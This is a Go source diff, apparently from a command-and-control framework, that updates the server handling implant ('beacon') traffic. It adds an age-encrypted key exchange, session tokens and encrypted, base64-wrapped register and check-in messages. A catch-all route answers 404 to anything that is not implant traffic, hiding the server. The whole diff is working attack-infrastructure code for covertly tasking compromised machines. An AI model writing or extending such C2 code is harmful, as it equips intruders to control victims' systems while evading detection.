@@ -1,12 +1,14 @@
 package c2
 
 import (
+	"crypto/rand"
+	"encoding/base64"
+	"encoding/hex"
 	"encoding/json"
 	"fmt"
 	"io"
 	"net/http"
 	"path/filepath"
-	"strconv"
 	"time"
 
 	"github.com/gin-gonic/gin"
@@ -18,10 +20,12 @@ import (
 )
 
 type HTTPServer struct {
-	engine      *gin.Engine
-	beaconStore *store.BeaconStore
-	taskStore   *store.ServerTaskStore
-	c2Profile   *protocol.C2Profile
+	engine        *gin.Engine
+	beaconStore   *store.BeaconStore
+	taskStore     *store.ServerTaskStore
+	sessionStore  *store.SessionStore
+	agePrivateKey string
+	c2Profile     *protocol.C2Profile
 }
 
 type debugCreateTaskRequest struct {
@@ -31,15 +35,23 @@ type debugCreateTaskRequest struct {
 	Payload   string `json:"payload"`
 }
 
-func NewHTTPServer(beaconStore *store.BeaconStore, taskStore *store.ServerTaskStore, c2Profile *protocol.C2Profile) *HTTPServer {
+func NewHTTPServer(
+	beaconStore *store.BeaconStore,
+	taskStore *store.ServerTaskStore,
+	sessionStore *store.SessionStore,
+	agePrivateKey string,
+	c2Profile *protocol.C2Profile,
+) *HTTPServer {
 	engine := gin.New()
 	engine.Use(gin.Recovery(), gin.Logger())
 
 	srv := &HTTPServer{
-		engine:      engine,
-		beaconStore: beaconStore,
-		taskStore:   taskStore,
-		c2Profile:   c2Profile,
+		engine:        engine,
+		beaconStore:   beaconStore,
+		taskStore:     taskStore,
+		sessionStore:  sessionStore,
+		agePrivateKey: agePrivateKey,
+		c2Profile:     c2Profile,
 	}
 
 	srv.registerRoutes()
@@ -47,12 +59,9 @@ func NewHTTPServer(beaconStore *store.BeaconStore, taskStore *store.ServerTaskSt
 }
 
 func (s *HTTPServer) registerRoutes() {
-	// 调试和管理路由 — 精确匹配
 	s.engine.GET("/healthz", s.handleHealthz)
 	s.engine.GET("/debug/beacons", s.handleListBeacons)
 	s.engine.POST("/debug/tasks", s.handleCreateDebugTask)
-
-	// Catch-all: 所有未匹配的请求进入 C2 处理器
 	s.engine.NoRoute(s.handleC2Request)
 }
 
@@ -63,7 +72,6 @@ func (s *HTTPServer) Run(addr string) error {
 // ── Catch-all C2 处理 ──────────────────────────────────────────────
 
 func (s *HTTPServer) handleC2Request(c *gin.Context) {
-	// 只处理 POST
 	if c.Request.Method != http.MethodPost {
 		c.JSON(http.StatusNotFound, gin.H{"error": "not found"})
 		return
@@ -75,70 +83,128 @@ func (s *HTTPServer) handleC2Request(c *gin.Context) {
 		return
 	}
 
-	// 步骤1: 从 URL 提取 nonce → 确定 encoder
-	nonce := extractNonceFromRequest(c.Request)
-	encoderID := protocol.ExtractEncoderID(nonce, s.c2Profile.EncoderModulus)
+	ext := fileExt(c.Request.URL.Path)
 
-	enc, ok := protocol.GetEncoderByID(encoderID)
-	if !ok {
-		// 无法识别的 nonce → 这不是 C2 流量
+	// 密钥交换：不需要预先有 CipherContext
+	if ext == protocol.ExtKeyExchange {
+		s.handleKeyExchange(c, rawBody)
+		return
+	}
+
+	// 其他 C2 请求：从 session_token 查找 CipherContext
+	sessionToken := c.GetHeader("X-Session-Token")
+	cipherCtx := s.sessionStore.Get(sessionToken)
+	if cipherCtx == nil {
 		c.JSON(http.StatusNotFound, gin.H{"error": "not found"})
 		return
 	}
 
-	// 步骤2: 解码请求体
-	decodedBody, err := enc.Decode(rawBody)
+	// Base64 解码 → 解密
+	decoded, err := base64.StdEncoding.DecodeString(string(rawBody))
+	if err != nil {
+		c.JSON(http.StatusBadRequest, gin.H{"error": "decode failed"})
+		return
+	}
+	plaintext, err := cipherCtx.Decrypt(decoded)
+	if err != nil {
+		c.JSON(http.StatusBadRequest, gin.H{"error": "decrypt failed"})
+		return
+	}
+
+	// 按扩展名分发
+	var respBody []byte
+	switch ext {
+	case protocol.ExtRegister:
+		respBody = s.handleRegisterEncrypted(plaintext, c.ClientIP())
+	case protocol.ExtCheckin:
+		respBody = s.handleCheckinEncrypted(plaintext, c.ClientIP())
+	default:
+		c.JSON(http.StatusNotFound, gin.H{"error": "not found"})
+		return
+	}
+
+	if respBody == nil {
+		respBody = mustMarshalJSON(gin.H{"error": "internal error"})
+	}
+
+	// 加密 → Base64 编码 → 返回
+	respPacket, _, err := cipherCtx.Encrypt(respBody)
+	if err != nil {
+		c.JSON(http.StatusInternalServerError, gin.H{"error": "encrypt response"})
+		return
+	}
+	encodedResp := make([]byte, base64.StdEncoding.EncodedLen(len(respPacket)))
+	base64.StdEncoding.Encode(encodedResp, respPacket)
+
+	c.Data(http.StatusOK, "application/octet-stream", encodedResp)
+}
+
+// ── Key Exchange 处理 ──────────────────────────────────────────────
+
+func (s *HTTPServer) handleKeyExchange(c *gin.Context, rawBody []byte) {
+	// 1. Base64 解码 → Age 解密 → 得到 sKey
+	decoded, err := base64.StdEncoding.DecodeString(string(rawBody))
 	if err != nil {
 		c.JSON(http.StatusBadRequest, gin.H{"error": "decode failed"})
 		return
 	}
 
-	// 步骤3: 根据扩展名分发请求
-	ext := fileExt(c.Request.URL.Path)
-	var respBody []byte
-	switch ext {
-	case protocol.ExtRegister:
-		respBody = s.handleRegisterEncoded(decodedBody, c.ClientIP())
-	case protocol.ExtCheckin:
-		respBody = s.handleCheckinEncoded(decodedBody, c.ClientIP())
-	default:
-		c.JSON(http.StatusNotFound, gin.H{"error": "unknown message type"})
+	sKey, err := protocol.AgeDecryptFromImplant(decoded, s.agePrivateKey)
+	if err != nil {
+		c.JSON(http.StatusBadRequest, gin.H{"error": "decrypt key failed"})
 		return
 	}
 
-	// 步骤4: 编码响应体（用同一个 encoder）
-	var encodedResp []byte
-	if respBody != nil {
-		encodedResp, err = enc.Encode(respBody)
-		if err != nil {
-			c.JSON(http.StatusInternalServerError, gin.H{"error": "encode response"})
-			return
-		}
+	// 2. 创建 CipherContext + 生成 session token
+	cipherCtx, err := protocol.NewCipherContext(sKey)
+	if err != nil {
+		c.JSON(http.StatusInternalServerError, gin.H{"error": "create cipher failed"})
+		return
 	}
 
-	c.Data(http.StatusOK, contentTypeForEncoder(encoderID), encodedResp)
+	sessionToken := generateSessionToken()
+	s.sessionStore.Set(sessionToken, cipherCtx)
+
+	// 3. 加密 session_token 并返回（证明服务端持有私钥）
+	respPacket, _, err := cipherCtx.Encrypt([]byte(sessionToken))
+	if err != nil {
+		c.JSON(http.StatusInternalServerError, gin.H{"error": "encrypt response"})
+		return
+	}
+	encodedResp := make([]byte, base64.StdEncoding.EncodedLen(len(respPacket)))
+	base64.StdEncoding.Encode(encodedResp, respPacket)
+
+	c.Data(http.StatusOK, "application/octet-stream", encodedResp)
 }
 
-func (s *HTTPServer) handleRegisterEncoded(body []byte, remoteAddr string) []byte {
+func generateSessionToken() string {
+	b := make([]byte, 16)
+	if _, err := rand.Read(b); err != nil {
+		panic("crypto/rand.Read failed: " + err.Error())
+	}
+	return hex.EncodeToString(b)
+}
+
+// ── 加密后的 Register / Checkin 处理 ──────────────────────────────
+
+func (s *HTTPServer) handleRegisterEncrypted(body []byte, remoteAddr string) []byte {
 	var req beaconProtocol.RegisterRequest
 	if err := json.Unmarshal(body, &req); err != nil {
 		return mustMarshalError("invalid register request")
 	}
 
-	resp, err := handlers.HandleRegister(s.beaconStore, &req, remoteAddr)
+	resp, err := handlers.HandleRegister(s.beaconStore, s.sessionStore, &req, remoteAddr)
 	if err != nil {
 		return mustMarshalError(err.Error())
 	}
 	return mustMarshalJSON(resp)
 }
 
-func (s *HTTPServer) handleCheckinEncoded(body []byte, remoteAddr string) []byte {
+func (s *HTTPServer) handleCheckinEncrypted(body []byte, remoteAddr string) []byte {
 	var req beaconProtocol.CheckinRequest
 	if err := json.Unmarshal(body, &req); err != nil {
 		return mustMarshalError("invalid checkin request")
 	}
-
-	fmt.Println("checkin beacon_id:", req.BeaconID)
 
 	resp, err := handlers.HandleCheckin(s.beaconStore, s.taskStore, &req, remoteAddr)
 	if err != nil {
@@ -147,39 +213,10 @@ func (s *HTTPServer) handleCheckinEncoded(body []byte, remoteAddr string) []byte
 	return mustMarshalJSON(resp)
 }
 
-// ── Nonce 提取 ─────────────────────────────────────────────────────
-
-// extractNonceFromURL 从 URL 中提取 nonce 值。
-// 对 NonceMode=urlparam（默认）：读取 ?_=xxx
-// 对 NonceMode=url：遍历路径段取最后一个纯数字段
-// 这里做简化处理：先查 query，再查 path。
-func extractNonceFromRequest(r *http.Request) int {
-	// 1. 尝试从 query 参数 _ 取值
-	if nonceStr := r.URL.Query().Get("_"); nonceStr != "" {
-		if nonce, err := strconv.Atoi(nonceStr); err == nil {
-			return nonce
-		}
-	}
-
-	// 2. 尝试从 path 中取最后一个数字段
-	// path 格式: /api/assets/4729183/chunk.js → nonce=4729183
-	return 0
-}
-
 // ── 辅助函数 ───────────────────────────────────────────────────────
 
-// fileExt 返回 URL 路径中的文件扩展名（不含点）。
 func fileExt(path string) string {
 	return filepath.Ext(path)
-}
-
-func contentTypeForEncoder(encoderID int) string {
-	switch encoderID {
-	case 0:
-		return "application/json"
-	default:
-		return "application/octet-stream"
-	}
 }
 
 func mustMarshalJSON(v any) []byte {
